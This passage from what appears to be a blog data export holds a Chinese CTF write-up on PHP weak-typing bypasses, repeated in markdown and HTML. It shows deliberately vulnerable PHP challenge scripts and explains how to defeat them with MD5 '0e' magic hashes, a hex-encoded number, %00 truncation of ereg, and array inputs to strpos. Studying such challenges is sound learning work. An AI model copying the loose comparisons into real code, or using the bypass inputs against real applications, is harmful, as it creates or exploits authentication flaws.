a\";}\n?>\n```\n看看上面的代码，有点矛盾，让他们MD5加密之后相等，但是明文却不同，what？\n百度一下，发现QNKCDZO经过MD5 加密之后为：             0e830400451993494058024219903391\n\n原理：\n     PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。\n\n那么我们就可以用其他0exxxxx来进行比较就能拿到flag。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/202005041756418.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n以下这些字符串，md5哈希之后都是0e开头的：\n\ns878926199a\n0e545993274517709034328855841020\n\ns155964671a\n0e342768416822451524974117254469\n\ns214587387a\n0e848240448830537924465865611904\n\ns214587387a\n0e848240448830537924465865611904\n\ns878926199a\n0e545993274517709034328855841020\n\ns1091221200a\n0e940624217856561557816327384675\n\ns1885207154a\n0e509367213418206700842008763514\n\ns1502113478a\n0e861580163291561247404381396064\n\ns1885207154a\n0e509367213418206700842008763514\n\ns1836677006a\n0e481036490867661113260034900752\n\ns155964671a\n0e342768416822451524974117254469\n\ns1184209335a\n0e072485820392773389523109082030\n\ns1665632922a\n0e731198061491163073197128363787\n\ns1502113478a\n0e861580163291561247404381396064\n\ns1836677006a\n0e481036490867661113260034900752\n\ns1091221200a\n0e940624217856561557816327384675\n\ns155964671a\n0e342768416822451524974117254469\n\n\n**0×02.十六进制与数字比较**\n\n```\n<?php\nerror_reporting(0);\nfunction noother_says_correct($temp)\n{\n$flag = 'flag{test}';\n$one = ord('1'); //ord — 返回字符的 ASCII 码值\n$nine = ord('9'); //ord — 返回字符的 ASCII 码值\n$number = '3735929054';\n// Check all the input characters!\nfor ($i = 0; $i < strlen($number); $i++)\n{\n// Disallow all the digits!\n$digit = ord($temp{$i});\nif ( ($digit >= $one) && ($digit <= $nine) )\n{\n// Aha, digit not allowed!\nreturn \"flase\";\n}\n}\nif($number == $temp)\nreturn $flag;\n}\n$temp = $_GET['password'];\necho noother_says_correct($temp);\n?>\n```\n首先看看代码，函数要求变量temp不能存在1~9之间的数字，\n最后，又要求temp=3735929054;\n有点自相矛盾，**但php在转码时会把16进制转化为十进制**.于是把\n3735929054转换成16进制为0xdeadc0de，记得带上0x；\n把3735929054进行十六进制转化deadc0de，然后PHP再转回来，emmmm就欧克了\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200504190602471.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n**0×03.ereg正则%00截断**\n\n```\n<?php\n$flag = \"xxx\";\nif (isset ($_GET['password']))\n{\nif (ereg (\"^[a-zA-Z0-9]+$\", $_GET['password']) === FALSE)\n{\necho '\n\nYou password must be alphanumeric\n\n';\n}\nelse if (strlen($_GET['password']) < 8 && $_GET['password'] > 9999999)\n{\nif (strpos ($_GET['password'], '-') !== FALSE) //strpos — 查找字符串首次出现的位置\n{\ndie('Flag: ' . $flag);\n}\nelse\n{\necho('\n- have not been found\n\n');\n}\n}\nelse\n{\necho '\nInvalid password\n\n';\n}\n}\n?>\n```\n看来一下代码 <8,>9999999,存在矛盾\n\nereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。\n\n用正则匹配，如果有'a-zA-Z0-9'则直接错误，我们可以用%00来截断，在%00之后的数值函数无法识别,同时满足   strlen($_GET['password']) < 8 && $_GET['password'] > 9999999\n\n长度跟数值本来就矛盾，我们可以用1e8 即1x10的八次方或者用数组绕过。\n\nstrpos() 查找某字符串在另一字符串中第一次出现的位置（区分大小写），本题中需要匹配到\"*-*\"才能输出flag。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200504192904986.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n**0×04.strpos数组绕过**\n\n```\n<?php\n$flag = \"flag\";\nif (isset ($_GET['ctf'])) {\nif (@ereg (\"^[1-9]+$\", $_GET['ctf']) === FALSE)\necho '必须输入数字才行';\nelse if (strpos ($_GET['ctf'], '#biubiubiu') !== FALSE)\ndie('Flag: '.$flag);\nelse\necho '骚年，继续努力吧啊~';\n}\n?>\n```\n看看代码\n首先看到的是get传参 ctf，然后必须是数字，然后再绕过 strpos。\nstrpos函数可以用数组绕过。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200504214809607.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\nemmmmm，flag到手。\n","source":"_posts/PHP弱类型及绕过方式（二）.md","raw":"---\ntitle: PHP弱类型及绕过方式（二）\ndate: 2020-05-04 15:04:05\ntags: php学习\ncategories: 技术\nphotos:  https://cdn.jsdelivr.net/gh/yremp/cdn@2.1.5/img/cover/(4).jpg.webp\n---\n\n\n\n继续！！！\n\n目录：\n         0×01.md5加密相等绕过\n         0×02.十六进制与数字比较\n         0×03.ereg正则%00截断\n         0×04.strpos数组绕过\n\n\n  **0×01.md5加密相等绕过**\n\n```\n<?php\n$md51 = md5('QNKCDZO');\n$a = @$_GET['a'];\n$md52 = @md5($a);\nif(isset($a)){\nif ($a != 'QNKCDZO' && $md51 == $md52) {\necho \"flag{*}\";\n} else {\necho \"false!!!\";\n}}\nelse{echo \"please input a\";}\n?>\n```\n看看上面的代码，有点矛盾，让他们MD5加密之后相等，但是明文却不同，what？\n百度一下，发现QNKCDZO经过MD5 加密之后为：             0e830400451993494058024219903391\n\n原理：\n     PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。\n\n那么我们就可以用其他0exxxxx来进行比较就能拿到flag。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/202005041756418.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n以下这些字符串，md5哈希之后都是0e开头的：\n\ns878926199a\n0e545993274517709034328855841020\n\ns155964671a\n0e342768416822451524974117254469\n\ns214587387a\n0e848240448830537924465865611904\n\ns214587387a\n0e848240448830537924465865611904\n\ns878926199a\n0e545993274517709034328855841020\n\ns1091221200a\n0e940624217856561557816327384675\n\ns1885207154a\n0e509367213418206700842008763514\n\ns1502113478a\n0e861580163291561247404381396064\n\ns1885207154a\n0e509367213418206700842008763514\n\ns1836677006a\n0e481036490867661113260034900752\n\ns155964671a\n0e342768416822451524974117254469\n\ns1184209335a\n0e072485820392773389523109082030\n\ns1665632922a\n0e731198061491163073197128363787\n\ns1502113478a\n0e861580163291561247404381396064\n\ns1836677006a\n0e481036490867661113260034900752\n\ns1091221200a\n0e940624217856561557816327384675\n\ns155964671a\n0e342768416822451524974117254469\n\n\n**0×02.十六进制与数字比较**\n\n```\n<?php\nerror_reporting(0);\nfunction noother_says_correct($temp)\n{\n$flag = 'flag{test}';\n$one = ord('1'); //ord — 返回字符的 ASCII 码值\n$nine = ord('9'); //ord — 返回字符的 ASCII 码值\n$number = '3735929054';\n// Check all the input characters!\nfor ($i = 0; $i < strlen($number); $i++)\n{\n// Disallow all the digits!\n$digit = ord($temp{$i});\nif ( ($digit >= $one) && ($digit <= $nine) )\n{\n// Aha, digit not allowed!\nreturn \"flase\";\n}\n}\nif($number == $temp)\nreturn $flag;\n}\n$temp = $_GET['password'];\necho noother_says_correct($temp);\n?>\n```\n首先看看代码，函数要求变量temp不能存在1~9之间的数字，\n最后，又要求temp=3735929054;\n有点自相矛盾，**但php在转码时会把16进制转化为十进制**.于是把\n3735929054转换成16进制为0xdeadc0de，记得带上0x；\n把3735929054进行十六进制转化deadc0de，然后PHP再转回来，emmmm就欧克了\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200504190602471.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n**0×03.ereg正则%00截断**\n\n```\n<?php\n$flag = \"xxx\";\nif (isset ($_GET['password']))\n{\nif (ereg (\"^[a-zA-Z0-9]+$\", $_GET['password']) === FALSE)\n{\necho '\n\nYou password must be alphanumeric\n\n';\n}\nelse if (strlen($_GET['password']) < 8 && $_GET['password'] > 9999999)\n{\nif (strpos ($_GET['password'], '-') !== FALSE) //strpos — 查找字符串首次出现的位置\n{\ndie('Flag: ' . $flag);\n}\nelse\n{\necho('\n- have not been found\n\n');\n}\n}\nelse\n{\necho '\nInvalid password\n\n';\n}\n}\n?>\n```\n看来一下代码 <8,>9999999,存在矛盾\n\nereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。\n\n用正则匹配，如果有'a-zA-Z0-9'则直接错误，我们可以用%00来截断，在%00之后的数值函数无法识别,同时满足   strlen($_GET['password']) < 8 && $_GET['password'] > 9999999\n\n长度跟数值本来就矛盾，我们可以用1e8 即1x10的八次方或者用数组绕过。\n\nstrpos() 查找某字符串在另一字符串中第一次出现的位置（区分大小写），本题中需要匹配到\"*-*\"才能输出flag。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200504192904986.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n**0×04.strpos数组绕过**\n\n```\n<?php\n$flag = \"flag\";\nif (isset ($_GET['ctf'])) {\nif (@ereg (\"^[1-9]+$\", $_GET['ctf']) === FALSE)\necho '必须输入数字才行';\nelse if (strpos ($_GET['ctf'], '#biubiubiu') !== FALSE)\ndie('Flag: '.$flag);\nelse\necho '骚年，继续努力吧啊~';\n}\n?>\n```\n看看代码\n首先看到的是get传参 ctf，然后必须是数字，然后再绕过 strpos。\nstrpos函数可以用数组绕过。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200504214809607.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\nemmmmm，flag到手。\n","slug":"PHP弱类型及绕过方式（二）","published":1,"updated":"2020-05-11T09:00:14.378Z","comments":1,"layout":"post","link":"","_id":"ckchhpsg700029kq6fdih6cos","content":"<p>继续！！！</p>\n<p>目录：<br>         0×01.md5加密相等绕过<br>         0×02.十六进制与数字比较<br>         0×03.ereg正则%00截断<br>         0×04.strpos数组绕过</p>\n<p>  <strong>0×01.md5加密相等绕过</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$md51 &#x3D; md5(&#39;QNKCDZO&#39;);</span><br><span class=\"line\">$a &#x3D; @$_GET[&#39;a&#39;];</span><br><span class=\"line\">$md52 &#x3D; @md5($a);</span><br><span class=\"line\">if(isset($a))&#123;</span><br><span class=\"line\">if ($a !&#x3D; &#39;QNKCDZO&#39; &amp;&amp; $md51 &#x3D;&#x3D; $md52) &#123;</span><br><span class=\"line\">echo &quot;flag&#123;*&#125;&quot;;</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">echo &quot;false!!!&quot;;</span><br><span class=\"line\">&#125;&#125;</span><br><span class=\"line\">else&#123;echo &quot;please input a&quot;;&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>看看上面的代码，有点矛盾，让他们MD5加密之后相等，但是明文却不同，what？<br>百度一下，发现QNKCDZO经过MD5 加密之后为：             0e830400451993494058024219903391</p>\n<p>原理：<br>     PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p>\n<p>那么我们就可以用其他0exxxxx来进行比较就能拿到flag。<br><img src=\"https://img-blog.csdnimg.cn/202005041756418.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>以下这些字符串，md5哈希之后都是0e开头的：</p>\n<p>s878926199a<br>0e545993274517709034328855841020</p>\n<p>s155964671a<br>0e342768416822451524974117254469</p>\n<p>s214587387a<br>0e848240448830537924465865611904</p>\n<p>s214587387a<br>0e848240448830537924465865611904</p>\n<p>s878926199a<br>0e545993274517709034328855841020</p>\n<p>s1091221200a<br>0e940624217856561557816327384675</p>\n<p>s1885207154a<br>0e509367213418206700842008763514</p>\n<p>s1502113478a<br>0e861580163291561247404381396064</p>\n<p>s1885207154a<br>0e509367213418206700842008763514</p>\n<p>s1836677006a<br>0e481036490867661113260034900752</p>\n<p>s155964671a<br>0e342768416822451524974117254469</p>\n<p>s1184209335a<br>0e072485820392773389523109082030</p>\n<p>s1665632922a<br>0e731198061491163073197128363787</p>\n<p>s1502113478a<br>0e861580163291561247404381396064</p>\n<p>s1836677006a<br>0e481036490867661113260034900752</p>\n<p>s1091221200a<br>0e940624217856561557816327384675</p>\n<p>s155964671a<br>0e342768416822451524974117254469</p>\n<p><strong>0×02.十六进制与数字比较</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">function noother_says_correct($temp)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">$flag &#x3D; &#39;flag&#123;test&#125;&#39;;</span><br><span class=\"line\">$one &#x3D; ord(&#39;1&#39;); &#x2F;&#x2F;ord — 返回字符的 ASCII 码值</span><br><span class=\"line\">$nine &#x3D; ord(&#39;9&#39;); &#x2F;&#x2F;ord — 返回字符的 ASCII 码值</span><br><span class=\"line\">$number &#x3D; &#39;3735929054&#39;;</span><br><span class=\"line\">&#x2F;&#x2F; Check all the input characters!</span><br><span class=\"line\">for ($i &#x3D; 0; $i &lt; strlen($number); $i++)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">&#x2F;&#x2F; Disallow all the digits!</span><br><span class=\"line\">$digit &#x3D; ord($temp&#123;$i&#125;);</span><br><span class=\"line\">if ( ($digit &gt;&#x3D; $one) &amp;&amp; ($digit &lt;&#x3D; $nine) )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">&#x2F;&#x2F; Aha, digit not allowed!</span><br><span class=\"line\">return &quot;flase&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">if($number &#x3D;&#x3D; $temp)</span><br><span class=\"line\">return $flag;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$temp &#x3D; $_GET[&#39;password&#39;];</span><br><span class=\"line\">echo noother_says_correct($temp);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>首先看看代码，函数要求变量temp不能存在1~9之间的数字，<br>最后，又要求temp=3735929054;<br>有点自相矛盾，<strong>但php在转码时会把16进制转化为十进制</strong>.于是把<br>3735929054转换成16进制为0xdeadc0de，记得带上0x；<br>把3735929054进行十六进制转化deadc0de，然后PHP再转回来，emmmm就欧克了<br><img src=\"https://img-blog.csdnimg.cn/20200504190602471.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br><strong>0×03.ereg正则%00截断</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$flag &#x3D; &quot;xxx&quot;;</span><br><span class=\"line\">if (isset ($_GET[&#39;password&#39;]))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) &#x3D;&#x3D;&#x3D; FALSE)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">echo &#39;</span><br><span class=\"line\"></span><br><span class=\"line\">You password must be alphanumeric</span><br><span class=\"line\"></span><br><span class=\"line\">&#39;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else if (strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 9999999)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">if (strpos ($_GET[&#39;password&#39;], &#39;-&#39;) !&#x3D;&#x3D; FALSE) &#x2F;&#x2F;strpos — 查找字符串首次出现的位置</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">die(&#39;Flag: &#39; . $flag);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">echo(&#39;</span><br><span class=\"line\">- have not been found</span><br><span class=\"line\"></span><br><span class=\"line\">&#39;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">echo &#39;</span><br><span class=\"line\">Invalid password</span><br><span class=\"line\"></span><br><span class=\"line\">&#39;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>看来一下代码 &lt;8,&gt;9999999,存在矛盾</p>\n<p>ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。</p>\n<p>用正则匹配，如果有’a-zA-Z0-9’则直接错误，我们可以用%00来截断，在%00之后的数值函数无法识别,同时满足   strlen($_GET[‘password’]) &lt; 8 &amp;&amp; $_GET[‘password’] &gt; 9999999</p>\n<p>长度跟数值本来就矛盾，我们可以用1e8 即1x10的八次方或者用数组绕过。</p>\n<p>strpos() 查找某字符串在另一字符串中第一次出现的位置（区分大小写），本题中需要匹配到”<em>-</em>“才能输出flag。<br><img src=\"https://img-blog.csdnimg.cn/20200504192904986.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br><strong>0×04.strpos数组绕过</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$flag &#x3D; &quot;flag&quot;;</span><br><span class=\"line\">if (isset ($_GET[&#39;ctf&#39;])) &#123;</span><br><span class=\"line\">if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#39;ctf&#39;]) &#x3D;&#x3D;&#x3D; FALSE)</span><br><span class=\"line\">echo &#39;必须输入数字才行&#39;;</span><br><span class=\"line\">else if (strpos ($_GET[&#39;ctf&#39;], &#39;#biubiubiu&#39;) !&#x3D;&#x3D; FALSE)</span><br><span class=\"line\">die(&#39;Flag: &#39;.$flag);</span><br><span class=\"line\">else</span><br><span class=\"line\">echo &#39;骚年，继续努力吧啊~&#39;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>看看代码<br>首先看到的是get传参 ctf，然后必须是数字，然后再绕过 strpos。<br>strpos函数可以用数组绕过。<br><img src=\"https://img-blog.csdnimg.cn/20200504214809607.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>emmmmm，flag到手。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>继续！！！</p>\n<p>目录：<br>         0×01.md5加密相等绕过<br>         0×02.十六进制与数字比较<br>         0×03.ereg正则%00截断<br>         0×04.strpos数组绕过</p>\n<p>  <strong>0×01.md5加密相等绕过</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$md51 &#x3D; md5(&#39;QNKCDZO&#39;);</span><br><span class=\"line\">$a &#x3D; @$_GET[&#39;a&#39;];</span><br><span class=\"line\">$md52 &#x3D; @md5($a);</span><br><span class=\"line\">if(isset($a))&#123;</span><br><span class=\"line\">if ($a !&#x3D; &#39;QNKCDZO&#39; &amp;&amp; $md51 &#x3D;&#x3D; $md52) &#123;</span><br><span class=\"line\">echo &quot;flag&#123;*&#125;&quot;;</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">echo &quot;false!!!&quot;;</span><br><span class=\"line\">&#125;&#125;</span><br><span class=\"line\">else&#123;echo &quot;please input a&quot;;&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>看看上面的代码，有点矛盾，让他们MD5加密之后相等，但是明文却不同，what？<br>百度一下，发现QNKCDZO经过MD5 加密之后为：             0e830400451993494058024219903391</p>\n<p>原理：<br>     PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p>\n<p>那么我们就可以用其他0exxxxx来进行比较就能拿到flag。<br><img src=\"https://img-blog.csdnimg.cn/202005041756418.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>以下这些字符串，md5哈希之后都是0e开头的：</p>\n<p>s878926199a<br>0e545993274517709034328855841020</p>\n<p>s155964671a<br>0e342768416822451524974117254469</p>\n<p>s214587387a<br>0e848240448830537924465865611904</p>\n<p>s214587387a<br>0e848240448830537924465865611904</p>\n<p>s878926199a<br>0e545993274517709034328855841020</p>\n<p>s1091221200a<br>0e940624217856561557816327384675</p>\n<p>s1885207154a<br>0e509367213418206700842008763514</p>\n<p>s1502113478a<br>0e861580163291561247404381396064</p>\n<p>s1885207154a<br>0e509367213418206700842008763514</p>\n<p>s1836677006a<br>0e481036490867661113260034900752</p>\n<p>s155964671a<br>0e342768416822451524974117254469</p>\n<p>s1184209335a<br>0e072485820392773389523109082030</p>\n<p>s1665632922a<br>0e731198061491163073197128363787</p>\n<p>s1502113478a<br>0e861580163291561247404381396064</p>\n<p>s1836677006a<br>0e481036490867661113260034900752</p>\n<p>s1091221200a<br>0e940624217856561557816327384675</p>\n<p>s155964671a<br>0e342768416822451524974117254469</p>\n<p><strong>0×02.十六进制与数字比较</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">function noother_says_correct($temp)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">$flag &#x3D; &#39;flag&#123;test&#125;&#39;;</span><br><span class=\"line\">$one &#x3D; ord(&#39;1&#39;); &#x2F;&#x2F;ord — 返回字符的 ASCII 码值</span><br><span class=\"line\">$nine &#x3D; ord(&#39;9&#39;); &#x2F;&#x2F;ord — 返回字符的 ASCII 码值</span><br><span class=\"line\">$number &#x3D; &#39;3735929054&#39;;</span><br><span class=\"line\">&#x2F;&#x2F; Check all the input characters!</span><br><span class=\"line\">for ($i &#x3D; 0; $i &lt; strlen($number); $i++)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">&#x2F;&#x2F; Disallow all the digits!</span><br><span class=\"line\">$digit &#x3D; ord($temp&#123;$i&#125;);</span><br><span class=\"line\">if ( ($digit &gt;&#x3D; $one) &amp;&amp; ($digit &lt;&#x3D; $nine) )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">&#x2F;&#x2F; Aha, digit not allowed!</span><br><span class=\"line\">return &quot;flase&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">if($number &#x3D;&#x3D; $temp)</span><br><span class=\"line\">return $flag;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$temp &#x3D; $_GET[&#39;password&#39;];</span><br><span class=\"line\">echo noother_says_correct($temp);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>首先看看代码，函数要求变量temp不能存在1~9之间的数字，<br>最后，又要求temp=3735929054;<br>有点自相矛盾，<strong>但php在转码时会把16进制转化为十进制</strong>.于是把<br>3735929054转换成16进制为0xdeadc0de，记得带上0x；<br>把3735929054进行十六进制转化deadc0de，然后PHP再转回来，emmmm就欧克了<br><img src=\"https://img-blog.csdnimg.cn/20200504190602471.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br><strong>0×03.ereg正则%00截断</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span 